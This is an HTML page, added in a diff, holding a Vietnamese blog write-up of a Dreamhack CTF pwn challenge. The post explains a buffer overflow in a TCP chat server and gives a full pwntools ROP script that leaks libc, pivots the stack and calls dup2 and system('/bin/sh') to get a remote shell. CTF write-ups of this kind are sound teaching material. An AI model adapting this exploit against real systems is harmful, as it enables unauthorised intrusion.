@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Dreamhack CTF Season 7 Round #5 (🚩Div1) - Cr0nica1</title><meta name="Description" content="Research blog about CTF, Web Security, and Reverse Engineering"><meta property="og:url" content="https://cr0nica1.github.io/posts/dhctf%237r5/">
+  <meta property="og:site_name" content="Cr0nica1">
+  <meta property="og:title" content="Dreamhack CTF Season 7 Round #5 (🚩Div1)">
+  <meta property="og:description" content="Giải này diễn ra tình cờ vào thời điểm mình vừa xong đợt trainning CTF nên có thời gian rảnh thử sức. Tuy nhiên bằng một cách thần kỳ nào đó mình lỡ bài rev khá tiếc mà giải được câu pwn này.
+Chat with Me - Binary exploitation I. Vulnerability Checksec và đọc Pseudocode trong IDA có NX, không có PIE và canary và có một lỗi buffer overflow:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-16T03:57:40+07:00">
+    <meta property="article:modified_time" content="2025-04-16T03:57:40+07:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Dreamhack CTF Season 7 Round #5 (🚩Div1)">
+  <meta name="twitter:description" content="Giải này diễn ra tình cờ vào thời điểm mình vừa xong đợt trainning CTF nên có thời gian rảnh thử sức. Tuy nhiên bằng một cách thần kỳ nào đó mình lỡ bài rev khá tiếc mà giải được câu pwn này.
+Chat with Me - Binary exploitation I. Vulnerability Checksec và đọc Pseudocode trong IDA có NX, không có PIE và canary và có một lỗi buffer overflow:">
+<meta name="application-name" content="Cr0nica1">
+<meta name="apple-mobile-web-app-title" content="Cr0nica1"><meta name="theme-color" content="#000000"><meta name="msapplication-TileColor" content="#111111"><link rel="icon" href="/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#00ffff"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://cr0nica1.github.io/posts/dhctf%237r5/" /><link rel="prev" href="https://cr0nica1.github.io/posts/research/" /><link rel="next" href="https://cr0nica1.github.io/posts/dhweb/" /><link rel="stylesheet" href="/css/style.min.49088c0fd33ec2f46f197451ea52e0cafa9bc6da2935c1144274ca89e79def3ed9f0c56fa78d4677d7a18208583ff518a21f8e035769334b81410737214c5443.css" integrity="sha512-SQiMD9M+wvRvGXRR6lLgyvqbxtopNcEUQnTKieed7z7Z8MVvp41Gd9ehgghYP/UYoh+OA1dpM0uBQQc3IUxUQw=="><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Dreamhack CTF Season 7 Round #5 (🚩Div1)",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/cr0nica1.github.io\/posts\/dhctf%237r5\/"
+        },"genre": "posts","wordcount":  385 ,
+        "url": "https:\/\/cr0nica1.github.io\/posts\/dhctf%237r5\/","datePublished": "2025-04-16T03:57:40+07:00","dateModified": "2025-04-16T03:57:40+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "cr0nica1"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Cr0nica1"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="search..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Cr0nica1"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="search..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Dreamhack CTF Season 7 Round #5 (🚩Div1)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yourusername" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cr0nica1</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-04-16">2025-04-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;385 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;<span id="/posts/dhctf%237r5/" class="leancloud_visitors" data-flag-title="Dreamhack CTF Season 7 Round #5 (🚩Div1)">
+                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#chat-with-me---binary-exploitation">Chat with Me - Binary exploitation</a>
+      <ul>
+        <li><a href="#i-vulnerability">I. Vulnerability</a></li>
+        <li><a href="#ii-exploitation">II. Exploitation</a></li>
+        <li><a href="#iii-script">III. Script</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Giải này diễn ra tình cờ vào thời điểm mình vừa xong đợt trainning CTF nên có thời gian rảnh thử sức. Tuy nhiên bằng một cách thần kỳ nào đó mình lỡ bài rev khá tiếc mà giải được câu pwn này.</p>
+<h2 id="chat-with-me---binary-exploitation">Chat with Me - Binary exploitation</h2>
+<h3 id="i-vulnerability">I. Vulnerability</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/SJxenTYj1l.png"
+        data-srcset="https://hackmd.io/_uploads/SJxenTYj1l.png, https://hackmd.io/_uploads/SJxenTYj1l.png 1.5x, https://hackmd.io/_uploads/SJxenTYj1l.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/SJxenTYj1l.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/B1rb3aFi1g.png"
+        data-srcset="https://hackmd.io/_uploads/B1rb3aFi1g.png, https://hackmd.io/_uploads/B1rb3aFi1g.png 1.5x, https://hackmd.io/_uploads/B1rb3aFi1g.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/B1rb3aFi1g.png"
+        title="image" /></p>
+<p>Checksec và đọc Pseudocode trong IDA có NX, không có PIE và canary và có một lỗi buffer overflow:</p>
+<pre tabindex="0"><code>_QWORD buf[97];
+memset(buf, 0, 0x300uLL);
+v12 = read(v13, buf, 0x600uLL);
+</code></pre><p>Do chương trình có NX, vì vậy hướng tiếp cận sẽ không phải là ret2shellcode.</p>
+<h3 id="ii-exploitation">II. Exploitation</h3>
+<p>Chương trình sử dụng nhiều hàm gọi từ libc trước khi yêu cầu nhập vào bộ đệm, đồng thời cho nhập tận 0x600 byte. Do vậy ý tưởng sẽ là leak giá trị từ bảng GOT và tìm libc_base. Đọc trong stack trên IDA, cần phải padding 840 byte thì chúng ta sẽ đến ret_address, thử nhập 848 byte để kiểm tra trong GDB:
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/HkcUATtiJg.png"
+        data-srcset="https://hackmd.io/_uploads/HkcUATtiJg.png, https://hackmd.io/_uploads/HkcUATtiJg.png 1.5x, https://hackmd.io/_uploads/HkcUATtiJg.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/HkcUATtiJg.png"
+        title="image" /></p>
+<p>Như vậy là chúng ta đã ghi đè được, tiếp đến chúng ta cần tìm các gadget để gọi hàm read, biết rằng fd của chúng ta là 4.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/Byc3CpFo1g.png"
+        data-srcset="https://hackmd.io/_uploads/Byc3CpFo1g.png, https://hackmd.io/_uploads/Byc3CpFo1g.png 1.5x, https://hackmd.io/_uploads/Byc3CpFo1g.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/Byc3CpFo1g.png"
+        title="image" /></p>
+<p>Có sẵn một gadget rất đẹp ở đây. Tuy nhiên ở đây thì mình sợ rằng việc overflow sẽ khiến một vài hàm đặc biệt kiểm tra tình trạng kết nối làm mất connection nên để an toàn mình stack pivot sang một vùng có quyền rw, và do cũng không có PIE nên mình dễ dàng bổ sung vào payload các gadget để stack pivot và thực hiển read một lần nữa. Mình tìm thêm gadget pop_rbp và gadget leave_ret. Payload đầu tiên để leak libc_base và yêu cầu hàm read thêm 1 lần nữa.</p>
+<pre tabindex="0"><code>payload=b&#39;A&#39;*840
+payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
+payload+=p64(elf.plt[&#39;send&#39;])
+payload+=p64(pop_rbp)+p64(0x404900)
+payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
+payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
+</code></pre><p>Bình thường thì đến đây sẽ khá đơn giản vì payload thứ 2 là gọi system(&rsquo;/bin/sh&rsquo;). Tuy nhiên điều phức tạp ở đây là fd của chúng ta là 4, còn shell tương tác với stdin và stdout ở fd=0 và fd=1. Chúng ta cần ép nó về fd=4:</p>
+<pre tabindex="0"><code>dup2(4,0);
+dup2(4,1);
+</code></pre><h3 id="iii-script">III. Script</h3>
+<pre tabindex="0"><code>from pwn import *
+context.binary=elf=ELF(&#39;./chall&#39;,checksec=False)
+libc=ELF(&#39;./libc.so.6&#39;,checksec=False)
+gadget=0x0000000000401396
+pop_rbp=0x40137d
+push_rsp=0x207768
+leave_ret=0x4016ca
+
+p=remote(&#39;host3.dreamhack.games&#39;,20267)
+p.recvuntil(b&#39;Welcome to the TCP Chat Server!\n&#39;)
+
+payload=b&#39;A&#39;*840
+payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
+payload+=p64(elf.plt[&#39;send&#39;])
+payload+=p64(pop_rbp)+p64(0x404900)
+payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
+payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
+p.send(payload)
+
+leak=u64(p.recvn(8))
+log.info(f&#39;leak: {hex(leak)}&#39;)
+lib_base=leak-libc.sym[&#39;puts&#39;]
+lib_system=lib_base+libc.sym[&#39;system&#39;]
+log.info(f&#39;lib base: {hex(lib_base)}&#39;)
+
+payload=p64(0)+p64(gadget+2)+p64(0)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
+payload+=p64(gadget+2)+p64(1)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
+payload+=p64(gadget+3)+p64(lib_base+next(libc.search(b&#39;/bin/sh&#39;)))+p64(gadget+4)+p64(lib_system)
+
+p.send(payload)
+p.interactive()
+</code></pre><h1 id="iv-reference">IV. Reference</h1>
+<p><a href="https://dreamhack.io/ctf/659" target="_blank" rel="noopener noreffer ">https://dreamhack.io/ctf/659</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-04-16</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://cr0nica1.github.io/posts/dhctf%237r5/" data-title="Dreamhack CTF Season 7 Round #5 (🚩Div1)"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://cr0nica1.github.io/posts/dhctf%237r5/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://cr0nica1.github.io/posts/dhctf%237r5/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://cr0nica1.github.io/posts/dhctf%237r5/" data-title="Dreamhack CTF Season 7 Round #5 (🚩Div1)"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://cr0nica1.github.io/posts/dhctf%237r5/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/research/" class="prev" rel="prev" title="Research: Packing và Unpacking trong reverse engineering"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Research: Packing và Unpacking trong reverse engineering</a>
+            <a href="/posts/dhweb/" class="next" rel="next" title="Dreamhack Web Wargame">Dreamhack Web Wargame<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yourusername" target="_blank">cr0nica1</a></span>&nbsp;|&nbsp;<span class="license">Content licensed by cr0nica1</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.5.3/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":80},"comment":{"valine":{"appId":"your-leancloud-appId","appKey":"your-leancloud-appKey","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@15.1.2/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Comment...","recordIP":false,"visitor":true}},"data":{"id-1":"Cr0nica1","id-2":"Cr0nica1"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":true,"left":"$$","right":"$$"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"},{"display":false,"left":"$","right":"$"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.bfc24322c1c736fc87270bfd02b29a3f1ec4316ce28d843a95e7f86122d3014725629b2cbba45f999fae1ec040433cefdf4a20bf2bf2aae4698cb1e66eafeb42.js" integrity="sha512-v8JDIsHHNvyHJwv9ArKaPx7EMWzijYQ6lef4YSLTAUclYpssu6RfmZ+uHsBAQzzv30ogvyvyquRpjLHmbq/rQg=="></script></body>
+</html>
